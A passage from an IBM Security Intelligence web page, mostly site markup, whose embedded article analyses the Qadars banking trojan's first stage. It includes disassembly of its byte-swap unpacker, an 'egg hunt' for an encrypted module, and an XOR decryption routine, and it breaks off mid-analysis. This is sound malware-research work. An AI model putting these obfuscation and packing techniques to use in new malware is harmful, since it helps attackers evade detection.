member of the IBM X-Force Advanced Research Team. After graduating from NYU-POLY he went to work for the US government. His main areas of interest are reverse engineering and low level programming.","sameAs":[]}]}</script>
<!-- / Yoast SEO Premium plugin. -->


</head>

<body class="si_body" >
    <nav id="navigation" class="navigation navigation--homepage " aria-label="Security Intelligence">
        <div class="container">
            <div class="row">

                <!-- LOGO -->
                <div class="navigation__brand">
                    <a href="https://securityintelligence.com" title="Security Intelligence" tabindex="1">
                        <amp-img width="280" height="31" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/logo-white.svg" alt="Security Intelligence Logo">
                            <div fallback>
                                <h6>Security Intelligence</h6>                            </div>
                        </amp-img>
                    </a>
                </div>

                <!-- DESKTOP MENU - HOVER -->
                <div class="navigation__menu" onmouseleave="delete localStorage['megamenu-status']">
                    <a tabindex="2" id="nav-news" href="/news/" class="navigation__button " data-menu="megamenu__news" onclick="localStorage['megamenu-status'] = 'first-interaction';">News</a>

                    <a tabindex="4" id="nav-topics" href="/category/topics/" class="navigation__button " data-menu="megamenu__topics" onclick="localStorage['megamenu-status'] = 'first-interaction';">Topics</a>
                    <a tabindex="5" id="nav-x-force" href="/x-force/" class="navigation__button " data-menu="megamenu__threat" onclick="localStorage['megamenu-status'] = 'first-interaction';">X-Force</a>
                    <a tabindex="6" id="nav-media" href="/media/" class="navigation__button " data-menu="megamenu__podcast" onclick="localStorage['megamenu-status'] = 'first-interaction';">Podcast</a>
                    <button aria-label="search Button" class="navigation__search" onclick="document.getElementById('search__input').focus()" on="tap:search.toggleClass(class='megamenu__open')" role="link" tabindex="-1" type="button">
                        <amp-img tabindex="7" width="24" height="24" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/search.svg" alt="Click to open the search bar"></amp-img>
                    </button>
                </div>

                <!-- TABLET MENU - TAP/CLICK -->
                <div id="search-tablet" class="navigation__menu navigation__menu--tablet" tabindex="-1">
                    <button type="button" class="navigation__button " data-menu="megamenu__news">News</button>
                    
                    <button type="button" class="navigation__button " data-menu="megamenu__topics" on="tap:megamenu__news.hide, megamenu__series.hide, megamenu__topics.show, megamenu__industries.hide, megamenu__threat.hide, megamenu__podcast.hide, megamenu__events.hide, megamenu__mask.show" role="link" tabindex="0">Topics</button>
                    <button type="button" class="navigation__button " data-menu="megamenu__threat" on="tap:megamenu__news.hide, megamenu__series.hide, megamenu__topics.hide, megamenu__industries.hide, megamenu__threat.show, megamenu__podcast.hide, megamenu__events.hide, megamenu__mask.show" role="link" tabindex="0">Threat Research</button>
                    <button type="button" class="navigation__button " data-menu="megamenu__podcast" on="tap:megamenu__news.hide, megamenu__series.hide, megamenu__topics.hide, megamenu__industries.hide, megamenu__threat.hide, megamenu__podcast.show, megamenu__events.hide, megamenu__mask.show" role="link" tabindex="0">Podcast</button>
                    <button type="button" aria-labelledby="search-tablet" class="navigation__search" onclick="document.getElementById('search__input').focus()" on="tap:search.toggleClass(class='megamenu__open')" role="link" tabindex="0">
                        <amp-img width="24" height="24" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/search.svg" alt="Search"></amp-img>
                    </button>
                </div>

                <!-- SEARCH -->
                <form id="search" class="search " method="GET" action="/" target="_top" tabindex="-1">
                    <amp-autocomplete filter="prefix" src="https://securityintelligence.com/wp-content/themes/sapphire/app/jsons/suggestions.json" suggest-first submit-on-enter on="select:search.submit" tabindex="-1">
                        <input id="search__input" tabindex="-1" type="text" name="s" autocomplete="on" placeholder="What would you like to search for?" aria-label="Search" oninput="validateInput(this)" required>
                    </amp-autocomplete>

                    <button tabindex="-1" value="submit" type="submit" class="search__submit" aria-label="Click to search">
                        <amp-img width="20" height="20" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/search.svg" alt="Search"></amp-img>
                        <span>Search</span>
                    </button>
                    <button tabindex="-1" value="reset" class="search__close" type="reset" aria-labelledby="search" on="tap:search.toggleClass(class='megamenu__open')" role="link">
                        <amp-img width="14" height="14" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/close.svg" alt="Close"></amp-img>
                    </button>
                </form>






                <!-- MEGAMENU -->
                <div id="navigation__mega">

                    <!-- NEWS -->
                    <section id="megamenu__news" class="megamenu" data-menu="nav-news" on="tap:megamenu__news.show, megamenu__mask.show" role="link" tabindex="0">
                        <amp-list layout="responsive" width="1440" height="248" credentials="include" src="https://securityintelligence.com/wp-content/themes/sapphire/app/jsons/posts.php?quantity=4&type=ibm_news" binding="no">
                            <template type="amp-mustache">
                                <div class="row">

                                    <!-- ARTICLES -->
                                    {{#articles}}
                                        <article class="megamenu__article">
                                            <a href="{{permalink}}" class="megamenu__link">
                                                <div class="megamenu__image">
                                                    <amp-img width="630" height="330" layout="responsive" src="{{image}}" alt="{{image_alt}}"></amp-img>
                                                </div>
                                                <h3 class="megamenu__title">{{title}}</h3>
                                            </a>
                                        </article>
                                    {{/articles}}

                                    <!-- VIEW MORE -->
                                    <a href="/news/" class="megamenu__more">
                                        <amp-img width="24" height="24" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/post-type-icons/news.svg" alt="News"></amp-img>
                                        <span>View All News</span>
                                    </a>

                                </div>
                            </template>
                        </amp-list>
                    </section>

                    <!-- SERIES -->


                    <!-- TOPICS -->
                    <section id="megamenu__topics" class="megamenu" data-menu="nav-topics" on="tap: megamenu__topics.show, megamenu__mask.show" role="link" tabindex="0">
                        <div class="row">

                            <!-- LISTS -->
                            <div class="megamenu__list">
                                <a href="/category/app-security/">Application Security</a>
                                <a href="/category/artificial-intelligence/">Artificial Intelligence</a>
                                <a href="/category/ciso-corner/">CISO</a>
                                <a href="/category/cloud-protection/">Cloud Security</a>
                                <a href="/category/data-protection/">Data Protection</a>
                                <a href="/category/endpoint/">Endpoint</a>
                            </div>
                            <div class="megamenu__list">
                                <a href="/category/fraud-protection/">Fraud Protection</a>
                                <a href="/category/identity-access/">Identity & Access</a>
                                <a href="/category/incident-response/">Incident Response</a>
                                <a href="/category/mainframe/">Mainframe</a>
                                <a href="/category/network/">Network</a>
                                <a href="/category/risk-management/">Risk Management</a>
                            </div>
                            <div class="megamenu__list">
                                <a href="/category/security-intelligence-analytics/">Intelligence & Analytics</a>
                                <a href="/category/security-services/">Security Services</a>
                                <a href="/category/threat-hunting/">Threat Hunting</a>
                                <a href="/category/topics/zero-trust/">Zero Trust</a>
                                <a href="/infographic-zero-trust-policy/">Infographic: Zero trust policy</a>
                            </div>
                            <div class="megamenu__list">
                                <span>Industries</span>
                                <a href="/category/banking-financial-services-industry/">Banking & Finance</a>
                                <a href="/category/energy-utility-industry/">Energy & Utility</a>
                                <a href="/category/government/">Government</a>
                                <a href="/category/health-care-industry/">Healthcare</a>
                            </div>

                            <!-- VIEW MORE -->
                            <a href="/category/topics/" class="megamenu__more">
                                <amp-img width="24" height="24" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/post-type-icons/topics.svg" alt="Topics"></amp-img>
                                <span>View All Topics</span>
                            </a>

                        </div>
                    </section>

                    <!-- THREAT RESEARCH -->
                    <section id="megamenu__threat" class="megamenu" data-menu="nav-x-force" on="tap:megamenu__threat.show, megamenu__mask.show" role="link" tabindex="0">
                        <amp-list layout="responsive" width="1440" height="248" credentials="include" src="https://securityintelligence.com/wp-content/themes/sapphire/app/jsons/posts.php?quantity=4&category=x-force" binding="no">
                            <template type="amp-mustache">
                                <div class="row">

                                    <!-- ARTICLES -->
                                    {{#articles}}
                                        <article class="megamenu__article">
                                            <a href="{{permalink}}" class="megamenu__link">
                                                <div class="megamenu__image">
                                                    <amp-img width="630" height="330" layout="responsive" src="{{image}}" alt="{{image_alt}}"></amp-img>
                                                </div>
                                                <h3 class="megamenu__title">{{title}}</h3>
                                            </a>
                                        </article>
                                    {{/articles}}

                                    <!-- VIEW MORE -->
                                    <a href="/x-force/" class="megamenu__more">
                                        <amp-img width="24" height="24" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/post-type-icons/threat-research.svg" alt="Threat Research"></amp-img>
                                        <span>View More From X-Force</span>
                                    </a>

                                </div>
                            </template>
                        </amp-list>
                    </section>

                    <!-- PODCAST -->
                    <section id="megamenu__podcast" class="megamenu" data-menu="nav-media" on="tap:megamenu__podcast.show, megamenu__mask.show" role="link" tabindex="0">
                        <amp-list layout="responsive" width="1440" height="248" credentials="include" src="https://securityintelligence.com/wp-content/themes/sapphire/app/jsons/posts.php?quantity=4&type=ibm_media" binding="no">
                            <template type="amp-mustache">
                                <div class="row">

                                    <!-- ARTICLES -->
                                    {{#articles}}
                                        <article class="megamenu__article">
                                            <a href="{{permalink}}" class="megamenu__link">
                                                <div class="megamenu__image">
                                                    <amp-img width="630" height="330" layout="responsive" src="{{image}}" alt="{{image_alt}}"></amp-img>
                                                </div>
                                                <h3 class="megamenu__title">{{title}}</h3>
                                            </a>
                                        </article>
                                    {{/articles}}

                                    <!-- VIEW MORE -->
                                    <a href="/media/" class="megamenu__more">
                                        <amp-img width="24" height="24" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/post-type-icons/podcast.svg" alt="Podcast"></amp-img>
                                        <span>View All Episodes</span>
                                    </a>

                                </div>
                            </template>
                        </amp-list>
                    </section>

                </div>

                <!-- MASK -->
                <div id="megamenu__mask" class="navigation__mask  " hidden></div>

                <!-- MEGAMENU SCRIPTS -->
                <script type="text/javascript">
                   
                    function validateInput(inputElement) {
                        // Regular expression to allow only letters (both uppercase and lowercase) and numbers
                        var regex = /^[A-Za-z0-9 ]*$/;

                        // Get the current value of the input field
                        var inputValue = inputElement.value;

                        // Check if the input value matches the allowed pattern
                        if (!regex.test(inputValue)) {
                            // If the input contains special characters, remove them
                            inputElement.value = inputValue.replace(/[^A-Za-z0-9 ]/g, '');
                        }
                    }
                    // DESKTOP MENU LINKS - HOVER ACTION
                    var elementList = document.querySelectorAll('.navigation__menu .navigation__button');
                    for (i = 0; i < elementList.length; i++) {

                        elementList[i].addEventListener('mouseenter', function() {
                            if (localStorage['megamenu-status'] !== 'first-interaction') {
                                var mega = document.getElementById("navigation__mega");
                                var menu_elements = document.getElementById(this.dataset.menu);
                                var mask = document.getElementById("megamenu__mask");
                                menu_elements.click();
                                mega.classList.add('amp-open');
                                menu_elements.classList.add('amp-open');
                                mask.classList.add('amp-open');
                            }
                        });

                        elementList[i].addEventListener('mouseleave', function() {
                            if (localStorage['megamenu-status'] !== 'first-interaction') {
                                var mega = document.getElementById("navigation__mega");
                                var menu_elements = document.getElementById(this.dataset.menu);
                                var mask = document.getElementById("megamenu__mask");
                                mega.classList.remove('amp-open');
                                menu_elements.classList.remove('amp-open');
                                mask.classList.remove('amp-open');
                            }
                        });
                    }

                    // TABLET MENU LINKS - CLICK ACTION
                    var elementList = document.querySelectorAll('.navigation__menu--tablet .navigation__button');
                    for (i = 0; i < elementList.length; i++) {

                        elementList[i].addEventListener('click', function() {
                            var mega = document.getElementById("navigation__mega");
                            var menu_elements = document.getElementById(this.dataset.menu);
                            var mask = document.getElementById("megamenu__mask");
                            menu_elements.click();
                            mega.classList.add('amp-open');
                            menu_elements.classList.add('amp-open');
                            mask.classList.add('amp-open');
                        });
                    }

                    // OPPENED MEGAMENU - HOVER ACTION
                    var elementList = document.querySelectorAll('.megamenu');
                    for (i = 0; i < elementList.length; i++) {

                        elementList[i].addEventListener('mouseenter', function() {
                            var mega = document.getElementById("navigation__mega");
                            var nav_elements = document.getElementById(this.dataset.menu);
                            var mask = document.getElementById("megamenu__mask");
                            this.classList.add('amp-open');
                            mega.classList.add('amp-open');
                            mask.classList.add('amp-open');
                            nav_elements.classList.add('amp-open');
                        });

                        elementList[i].addEventListener('mouseleave', function() {
                            var mega = document.getElementById("navigation__mega");
                            var nav_elements = document.getElementById(this.dataset.menu);
                            var mask = document.getElementById("megamenu__mask");
                            this.classList.remove('amp-open');
                            mega.classList.remove('amp-open');
                            mask.classList.remove('amp-open');
                            nav_elements.classList.remove('amp-open');
                        });
                    }
                </script>

                <!-- MOBILE ICON -->
                <button type="button" aria-labelledby="search-tablet" class="search__mobile__icon" onclick="document.getElementById('search__input').focus()" on="tap:search.toggleClass(class='megamenu__open')" role="link" tabindex="0">
                    <amp-img width="18" height="18" layout="fixed" src="https://securityintelligence.com/wp-content/themes/sapphire/images/search.svg" alt="Search"></amp-img>
                </button>

                <div class="navigation__mobile-icon" on="tap:navigation__mobile.toggleVisibility, navigation__hamburguer.toggleVisibility,
                  navigation__close.toggleVisibility " role="link" tabindex="0">
                    <amp-img id="navigation__hamburguer" width="24" height="24" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/hamburguer.svg" alt="Menu"></amp-img>
                    <amp-img id="navigation__close" width="24" height="24" layout="responsive" src="https://securityintelligence.com/wp-content/themes/sapphire/images/close.svg" alt="Close" hidden></amp-img>
                </div>

                <!-- MOBILE LIST -->
                <section id="navigation__mobile" class="navigation__mobile-list" hidden>
                    <div class="container">
                        <a href="/news/">News</a>

                        <!-- ACCORDIONS -->
                        <amp-accordion disable-session-states>
                            <!-- TOPICS -->
                            <section class="navigation__accordion">
                                <h2>Topics</h2>
                                <div class="navigation__accordion-content">
                                    <div class="row">
                                        <a href="/category/topics/">All Categories</a>
                                        <a href="/category/app-security/">Application Security</a>
                                        <a href="/category/identity-access/">Identity & Access</a>
                                        <a href="/category/artificial-intelligence/">Artificial Intelligence</a>
                                        <a href="/category/incident-response/">Incident Response</a>
                                        <a href="/category/ciso-corner/">CISO</a>
                                        <a href="/category/mainframe/">Mainframe</a>
                                        <a href="/category/cloud-protection/">Cloud Security</a>
                                        <a href="/category/mobile-security-podcasts/">Mobile Security</a>
                                        <a href="/category/data-protection/">Data Protection</a>
                                        <a href="/category/network/">Network</a>
                                        <a href="/category/endpoint/">Endpoint</a>
                                        <a href="/category/risk-management/">Risk Management</a>
                                        <a href="/category/fraud-protection/">Fraud Protection</a>
                                        <a href="/category/threat-hunting/">Threat Hunting</a>
                                        <a href="/category/security-services/">Security Services</a>
                                        <a href="/category/security-intelligence-analytics/">Security Intelligence & Analytics</a>
                                    </div>
                                    <div class="row">
                                        <span>Industries</span>
                                        <a href="/category/industries/banking-financial-services-industry/">Banking & Finance</a>
                                        <a href="/category/energy-utility-industry/">Energy & Utility</a>
                                        <a href="/category/government/">Government</a>
                                        <a href="/category/health-care-industry/">Healthcare</a>
                                    </div>
                                </div>
                            </section>
                        </amp-accordion>

                        <a href="/x-force/">X-Force</a>
                        <a href="/media/">Podcast</a>
                </section>
            </div>
        </div>
    </nav>
<!-- BACK TO TOP -->
<div class="scroll-to-top ">

    <!-- TOP VIEWER TRIGGER -->
    <div id="top-viewer" class="scroll-to-top__viewer"></div>

    <!-- BUTTON -->
    <div class="sticky" style="height: 100%;">
            
            <button     id="scrollToTopButton" 
                        on="tap:top-viewer.scrollTo(duration=200, position=bottom)" 
                        class="tap_target ">
                        
                        <div class="scroll-to-top__button">
                              <amp-img width="12" height="16" layout="fixed" alt="Back-to-top" src="https://securityintelligence.com/wp-content/themes/sapphire/images/scroll-to-top.svg"></amp-img>
                        </div>
            </button>

    </div>

    <!-- SCROLL SHOW/HIDE ANIMATION -->
    <amp-animation id="showAnim" layout="nodisplay">
        <script type="application/json">
            {
                "duration": "200ms",
                "fill": "both",
                "iterations": "1",
                "direction": "alternate",
                "animations": [{
                    "selector": "#scrollToTopButton",
                    "keyframes": [{
                        "opacity": "1",
                        "visibility": "visible"
                    }]
                }]
            }
        </script>
    </amp-animation>
    <amp-animation id="hideAnim" layout="nodisplay">
        <script type="application/json">
            {
                "duration": "200ms",
                "fill": "both",
                "iterations": "1",
                "direction": "alternate",
                "animations": [{
                    "selector": "#scrollToTopButton",
                    "keyframes": [{
                        "opacity": "0",
                        "visibility": "hidden"
                    }]
                }]
            }
        </script>
    </amp-animation>
</div>

<!-- CHECK PAGE POSITION -->
<amp-position-observer target="top-viewer" intersection-ratios="0" on="enter:hideAnim.start; exit:showAnim.start" layout="nodisplay"></amp-position-observer>

<!-- SCHEMA -->
<script id="post-schema" type="application/ld+json">
      {
      "@context": "http://schema.org",
      "@type": "Article",
      "headline": "An Analysis of the Qadars Banking Trojan",
      "mainEntityOfPage": "https://securityintelligence.com/an-analysis-of-the-qadars-trojan/",
      "author": {
            "@type": "Person",
            "name": "Igor Aronov"
      },
      "datePublished": "2015-07-23T04:10:20-04:00",
      "dateModified": "2020-03-20T17:21:36-04:00",
      "publisher": {
            "@type": "Organization",
            "name": "Security Intelligence",
            "logo":{
                  "@type": "ImageObject",
                  "url": "https://securityintelligence.com/wp-content/themes/security-intelligence/assets/img/logo.png"
            }
      },
      "image": [ "https://securityintelligence.com/wp-content/uploads/2015/07/Analyzing-the-Qadar-Trojan-630x330.png" ],
      "articleBody": "I recently noticed a &lt;a href=&quot;http://www.kernelmode.info/forum/viewtopic.php?f=16&amp;t=3096&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;forum thread&lt;/a&gt; discussing the Qadars banking Trojan, and at the time, it had a very low detection rate (4/56) on the VT (virustotal.com) SHA1 : 563379a48d876f6c35317bb7551efeb55754123056109ab030d1e796ae1b9c2c.

I decided it would be a decent candidate for a deeper technical look, and I divided my analysis into three logical parts:
&lt;ul&gt;
	&lt;li&gt;Stage 1: Obfuscates malicious program flow; protects and decrypts main module.&lt;/li&gt;
	&lt;li&gt;Stage 2: Gathers per-system unique information, establishes persistence on the system and runs new process (Stage 3).&lt;/li&gt;
	&lt;li&gt;Stage 3: Establishes communication with the command-and-control (C&amp;C) center.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;strong&gt;Stage 1&lt;/strong&gt;&lt;/h2&gt;
This stage consist of two distinct parts. Both are used to protect the main malware module from detection. The malware performs the following steps to achieve this:
&lt;ul&gt;
	&lt;li&gt;Obfuscates malware&#039;s flow by creating &quot;garbage&quot; code;&lt;/li&gt;
	&lt;li&gt;Changes the control flow of a program by creating a structured exception handling (SEH) exception and passing control to it;&lt;/li&gt;
	&lt;li&gt;Decrypts a blob of data that becomes new code section and jumps to it from an exception;&lt;/li&gt;
	&lt;li&gt;Performs an &quot;egg hunt&quot; to find an additional blob of data. This data is then decrypted and decompressed and becomes a new Portable Executable (PE) image. This is the main malware module.&lt;/li&gt;
&lt;/ul&gt;
Additional details about the first part of Stage 1 (exception handler):
&lt;ul&gt;
	&lt;li&gt;Resolves address of kernel32.&lt;/li&gt;
	&lt;li&gt;Resolves address of HeapCreate and allocates buffer of size 0x2729.
&lt;ul&gt;
	&lt;li&gt;Stack before the call to HeapCreate:&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;height:100 width-set:true width:100 width-unit:1 lang:default decode:true &quot;&gt;        012F7A0  00040000   ;HEAP_CREATE_ENABLE_EXECUTE
        012F7A4  00002729   ;initial size
        012F7A8  00002729   ;max size&lt;/pre&gt;
&lt;ul&gt;
	&lt;li&gt;Takes the blob of data at offset 0040C9E8 in the original file, then copies and arranges it.&lt;/li&gt;
&lt;/ul&gt;
This blob of data is treated as an array. The array after transformation becomes the new code section and control is passed to it. The steps taken by the malware to transform array into the valid code are simple bit swaps based on the key generated offset calculations. The algorithm is shown below:
&lt;ol&gt;
	&lt;li&gt;The blob of data is copied to a buffer allocated on the heap. The buffer is treated as an array.&lt;/li&gt;
	&lt;li&gt;Calculates an offset for the first character to be swapped:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;    ;Initial key is 0x5A219DBA.
    ;.text:0041F858 8B 45 14                mov     eax, [ebp+key]
    ;.text:0041F85B 33 D2                   xor     edx, edx
    ;.text:0041F85D F7 75 10                div     [ebp+data_size]
    ;.text:0041F860 89 55 E8                mov     [ebp+reminder], edx&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
	&lt;li&gt;Stores the result locally:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;    ;.text:0041FAC5 8B 4D 08                mov     ecx, [ebp+allocated_buffer]
    ;.text:0041FAC8 03 4D E8                add     ecx, [ebp+reminder]
    ;.text:0041FACB 8A 11                   mov     dl, [ecx]
    ;.text:0041FACD 88 55 E4                mov     [ebp+current_char_3], dl&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;
	&lt;li&gt;Calculates an offset for the second character to be swapped and stores it locally. This character is taken from the end of an array minus number of characters already processed:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;    ;.text:0041FC18 8B 55 08                mov     edx, [ebp+allocated_buffer]
    ;.text:0041FC1B 03 55 FC                add     edx, [ebp+counter]
    ;.text:0041FC1E 8A 42 FF                mov     al, [edx-1]
    ;.text:0041FC21 88 45 EC                mov     [ebp+current_char_1], a&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;
	&lt;li&gt;Swaps the first and second characters:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;height-set:true height:150 width:100 width-unit:1 lang:default decode:true&quot;&gt;    ;.text:0041FD4D 8B 45 08                mov     eax, [ebp+allocated_buffer]
    ;.text:0041FD50 03 45 E8                add     eax, [ebp+reminder]
    ;.text:0041FD53 8A 4D EC                mov     cl, [ebp+current_char_1]
    ;.text:0041FD56 88 08                   mov     [eax], cl

    ;.text:0041FFCE 8B 45 08                mov     eax, [ebp+allocated_buffer]
    ;.text:0041FFD1 03 45 FC                add     eax, [ebp+counter]
    ;.text:0041FFD4 8A 4D E4                mov     cl, [ebp+current_char_3]
    ;.text:0041FFD7 88 48 FF                mov     [eax-1], cl&lt;/pre&gt;
For example, the first two characters to be swapped. Memory before swap:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true  &quot;&gt;00BD0614  00 
00BD2728  A6&lt;/pre&gt;
Memory after swap:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;00BD0614  A6 
00BD2728  00&lt;/pre&gt;
&lt;ol start=&quot;6&quot;&gt;
	&lt;li&gt;Calculates the key used in the calculations for the next first character to be swapped:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;    ;.text:004201CD 8B 55 14                mov     edx, [ebp+key]
    ;.text:004201D0 C1 EA 19                shr     edx, 19h
    ;.text:004201D3 89 55 F0                mov     [ebp+new_key], edx
    ;.text:004203B1 8B 4D 14                mov     ecx, [ebp+key]
    ;.text:004203B4 C1 E1 07                shl     ecx, 7
    ;.text:004203B7 89 4D 14                mov     [ebp+key], ecx
    ;.text:00420680 8B 55 14                mov     edx, [ebp+key]
    ;.text:00420683 0B 55 F0                or      edx, [ebp+new_key]
    ;.text:00420686 89 55 14                mov     [ebp+key], edx
    ;.text:004207FB 8B 55 14                mov     edx, [ebp+key]
    ;.text:004207FE 2B 55 10                sub     edx, [ebp+data_size]
    ;.text:00420801 89 55 14                mov     [ebp+key], edx
    ;.text:00420AD5 8B 45 14                mov     eax, [ebp+key]
    ;.text:00420AD8 2D D2 02 96 49          sub     eax, 499602D2h
    ;.text:00420ADD 89 45 14                mov     [ebp+key], eax&lt;/pre&gt;
Jumps to the newly created code section:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;.text:00406447 FF 55 FC                call    [ebp+allocated_buffer]&lt;/pre&gt;
Additional details about part two of Stage 1 (in the newly created code section):
&lt;ul&gt;
	&lt;li&gt;Resolves API addresses at runtime and immediately calls those APIs; no Import Table is created.&lt;/li&gt;
	&lt;li&gt;Locates an XOR-encrypted blob of data.&lt;/li&gt;
	&lt;li&gt;Decrypts the blob of data and decompresses it.&lt;/li&gt;
	&lt;li&gt;The decrypted and decompressed blob is the main malware module.&lt;/li&gt;
&lt;/ul&gt;
To find a blob of data, the malware uses a technique similar to the &quot;egg hunt&quot; technique used in the shellcode. First, it calculated the following data:
&lt;pre class=&quot;height:100 width:100 width-unit:1 lang:default decode:true&quot;&gt;0012F74C  56 6F FC 5A 83 1A 34 D9  6F 5C 41 73 28 94 EF 13  VonZâ.4+o\As(ön.
0012F75C  31 A8 B9 0B 									    
1¿¦
&lt;/pre&gt;
The content of the main malware module is copied into a buffer allocated on the heap. The first 8 bytes are the marker that the malware is searching for in the executable. This is the so-called &quot;egg,&quot; and it is found at offset 0xE511 in the executable on the disk. The scanning is performed from the end to the beginning of the file. Once the marker is found, the malware calculates the size of the encrypted blob of data. In order to do this, it takes 4 bytes immediately following the &quot;egg&quot; and XORs it with the data at offset +0x08 in the blob of data shown above.

Next, 8 bytes in the file and in the blob of data above (offset +0x0C) are used to calculate the initial XOR key that is used to decrypt the blob of data. The encrypted data in the file starts at offset 0xE525; the size of the blob of data is 0xC76A. The following function is used to decrypt the blob of data:
&lt;pre class=&quot;height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;debug025:00BD0CBE                         decode_data_to_decompress proc near     
debug025:00BD0CBE
debug025:00BD0CBE                         var_18= dword ptr -18h
debug025:00BD0CBE                         var_14= dword ptr -14h
debug025:00BD0CBE                         var_10= dword ptr -10h
debug025:00BD0CBE                         var_C= dword ptr -0Ch
debug025:00BD0CBE                         var_4= dword ptr -4
debug025:00BD0CBE                         data= dword ptr  8
debug025:00BD0CBE                         size= dword ptr  0Ch
debug025:00BD0CBE                         key= dword ptr  10h
debug025:00BD0CBE
debug025:00BD0CBE 55                      push    ebp
debug025:00BD0CBF 89 E5                   mov     ebp, esp
debug025:00BD0CC1 83 EC 1C                sub     esp, 1Ch
debug025:00BD0CC4 53                      push    ebx
debug025:00BD0CC5 56                      push    esi
debug025:00BD0CC6 57                      push    edi
debug025:00BD0CC7 01 FF                   add     edi, edi
debug025:00BD0CC9 8B 5D 0C                mov     ebx, [ebp+size]
debug025:00BD0CCC F7 D0                   not     eax
debug025:00BD0CCE 42                      inc     edx
debug025:00BD0CCF 09 55 F0                or      [ebp+var_10], edx
debug025:00BD0CD2 83 EB 03                sub     ebx, 3
debug025:00BD0CD5 0F AF F7                imul    esi, edi
debug025:00BD0CD8 81 F1 B8 00 00 00       xor     ecx, 0B8h
debug025:00BD0CDE 8B 75 08                mov     esi, [ebp+data]
debug025:00BD0CE1 87 55 EC                xchg    edx, [ebp+var_14]
debug025:00BD0CE4 21 F2                   and     edx, esi
debug025:00BD0CE6
debug025:00BD0CE6                         loc_BD0CE6:                             
debug025:00BD0CE6 41                      inc     ecx
debug025:00BD0CE7 83 FB 00                cmp     ebx, 0               ; ebx is the counter
debug025:00BD0CEA 74 5C                   jz      short loc_BD0D48
debug025:00BD0CEC 49                      dec     ecx
debug025:00BD0CED 1B 55 F4                sbb     edx, [ebp+var_C]
debug025:00BD0CF0 8B 06                   mov     eax, [esi]
debug025:00BD0CF2 33 4D F4                xor     ecx, [ebp+var_C]
debug025:00BD0CF5 01 C9                   add     ecx, ecx
debug025:00BD0CF7 33 45 10                xor     eax, [ebp+key]
debug025:00BD0CFA 09 DF                   or      edi, ebx
debug025:00BD0CFC 89 06                   mov     [esi], eax
debug025:00BD0CFE 2B 55 EC                sub     edx, [ebp+var_14]
debug025:00BD0D01 F7 DF                   neg     edi
debug025:00BD0D03 49                      dec     ecx
debug025:00BD0D04 8B 45 10                mov     eax, [ebp+key]
debug025:00BD0D07 87 55 E8                xchg    edx, [ebp+var_18]
debug025:00BD0D0A 0F AF FA                imul    edi, edx
debug025:00BD0D0D F7 D7                   not     edi
debug025:00BD0D0F EB 03                   jmp     short loc_BD0D14

debug025:00BD0D14
debug025:00BD0D14                         loc_BD0D14:                             
debug025:00BD0D14 C1 C0 07                rol     eax, 7
debug025:00BD0D17 4A                      dec     edx
debug025:00BD0D18 01 F7                   add     edi, esi
debug025:00BD0D1A EB 01                   jmp     short loc_BD0D1D

debug025:00BD0D1D
debug025:00BD0D1D                         loc_BD0D1D:                             
debug025:00BD0D1D 2B 45 0C                sub     eax, [ebp+size]
debug025:00BD0D20 2B 55 FC                sub     edx, [ebp+var_4]
debug025:00BD0D23 87 FF                   xchg    edi, edi
debug025:00BD0D25 F7 D7                   not     edi
debug025:00BD0D27 2D D2 02 96 49          sub     eax, 499602D2h
debug025:00BD0D2C 83 EA 06                sub     edx, 6
debug025:00BD0D2F 01 F7                   add     edi, esi
debug025:00BD0D31 89 45 10                mov     [ebp+key], eax
debug025:00BD0D34 81 E2 80 00 00 00       and     edx, 80h
debug025:00BD0D3A 0B 4D E8                or      ecx, [ebp+var_18]
debug025:00BD0D3D 4B                      dec     ebx
debug025:00BD0D3E 11 C7                   adc     edi, eax
debug025:00BD0D40 29 C7                   sub     edi, eax
debug025:00BD0D42 46                      inc     esi
debug025:00BD0D43 0F AF FB                imul    edi, ebx
debug025:00BD0D46 EB 9E                   jmp     short loc_BD0CE6
debug025:00BD0D48                         ; ------------------------------
debug025:00BD0D48
debug025:00BD0D48                         loc_BD0D48:                             
debug025:00BD0D48 87 55 EC                xchg    edx, [ebp+var_14]
debug025:00BD0D4B 29 F3                   sub     ebx, esi
debug025:00BD0D4D 5F                      pop     edi
debug025:00BD0D4E 5E                      pop     esi
debug025:00BD0D4F 5B                      pop     ebx
debug025:00BD0D50 C9                      leave
debug025:00BD0D51 C2 0C 00                retn    0Ch
debug025:00BD0D51                         decode_data_to_decompress endp&lt;/pre&gt;
Next, the decrypted blob of data is decompressed. The stack before the call to RtlDecompressBuffer:
&lt;pre class=&quot;height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true&quot;&gt;0012F270  00000002                              ;compression format
